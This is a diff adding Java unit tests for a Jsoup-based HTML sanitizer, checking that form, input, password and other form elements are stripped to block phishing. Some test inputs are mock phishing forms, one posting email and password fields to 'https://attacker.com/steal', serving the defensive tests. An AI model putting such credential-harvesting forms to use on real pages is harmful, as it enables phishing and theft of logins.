@@ -134,6 +134,81 @@ class JsoupContentSanitizerTest {
     }
 
     @Nested
+    @DisplayName("피싱 방지: 폼 관련 태그 제거")
+    class PhishingFormRemoval {
+
+        @Test
+        @DisplayName("form 태그를 제거한다")
+        void removesFormTag() {
+            String html = "<html><body><form action='https://evil.com'><input type='text'></form><p>safe</p></body></html>";
+            String result = sanitizer.sanitize(html);
+            assertThat(result).doesNotContain("<form");
+            assertThat(result).doesNotContain("<input");
+            assertThat(result).contains("safe");
+        }
+
+        @Test
+        @DisplayName("password input을 제거한다")
+        void removesPasswordInput() {
+            String html = "<html><body><input type='password' name='pw'><p>content</p></body></html>";
+            String result = sanitizer.sanitize(html);
+            assertThat(result).doesNotContain("<input");
+            assertThat(result).doesNotContain("password");
+            assertThat(result).contains("content");
+        }
+
+        @Test
+        @DisplayName("textarea, select, button을 제거한다")
+        void removesFormElements() {
+            String html = "<html><body><textarea>text</textarea><select><option>a</option></select><button type='submit'>Submit</button><p>safe</p></body></html>";
+            String result = sanitizer.sanitize(html);
+            assertThat(result).doesNotContain("<textarea");
+            assertThat(result).doesNotContain("<select");
+            assertThat(result).doesNotContain("<option");
+            assertThat(result).doesNotContain("<button");
+            assertThat(result).contains("safe");
+        }
+
+        @Test
+        @DisplayName("피싱 로그인 폼을 완전히 제거한다")
+        void removesPhishingLoginForm() {
+            String html = """
+                    <html><body>
+                    <h1>Login</h1>
+                    <form action="https://attacker.com/steal" method="POST">
+                        <label for="email">Email</label>
+                        <input type="email" id="email" name="email">
+                        <label for="pw">Password</label>
+                        <input type="password" id="pw" name="password">
+                        <button type="submit">Sign In</button>
+                    </form>
+                    <p>Welcome</p>
+                    </body></html>
+                    """;
+            String result = sanitizer.sanitize(html);
+            assertThat(result).doesNotContain("<form");
+            assertThat(result).doesNotContain("<input");
+            assertThat(result).doesNotContain("<button");
+            assertThat(result).doesNotContain("<label");
+            assertThat(result).doesNotContain("attacker.com");
+            assertThat(result).contains("Login");
+            assertThat(result).contains("Welcome");
+        }
+
+        @Test
+        @DisplayName("fieldset, legend, datalist, output을 제거한다")
+        void removesAdditionalFormElements() {
+            String html = "<html><body><fieldset><legend>Info</legend></fieldset><datalist id='d'></datalist><output>result</output><p>safe</p></body></html>";
+            String result = sanitizer.sanitize(html);
+            assertThat(result).doesNotContain("<fieldset");
+            assertThat(result).doesNotContain("<legend");
+            assertThat(result).doesNotContain("<datalist");
+            assertThat(result).doesNotContain("<output");
+            assertThat(result).contains("safe");
+        }
+    }
+
+    @Nested
     @DisplayName("head 영역 새니타이징")
     class HeadSanitization {
 
